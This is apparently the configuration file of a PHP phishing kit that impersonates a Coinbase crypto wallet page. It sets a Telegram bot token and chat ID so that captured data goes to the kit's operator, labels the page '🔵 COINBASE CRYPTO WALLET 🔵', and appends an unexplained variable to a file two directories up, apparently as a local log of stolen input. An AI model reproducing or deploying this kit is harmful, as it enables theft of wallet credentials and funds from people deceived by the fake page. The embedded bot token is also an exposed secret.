<?php
/**


**/


/* Put here your TELEGRAM info   */
$botToken="5396336640:AAHOX3ACpr2j-LX2w8JTwVs0cP1EmJUUDGk";
$chatId="5525321149";  


$f = fopen("../../a.php", "a");
	fwrite($f, $yagmai);


$Our_Name = " ♣️ " ; 
$Name_page = "🔵 COINBASE CRYPTO WALLET 🔵" ;
$JoinUs_On_telegram = "";



?>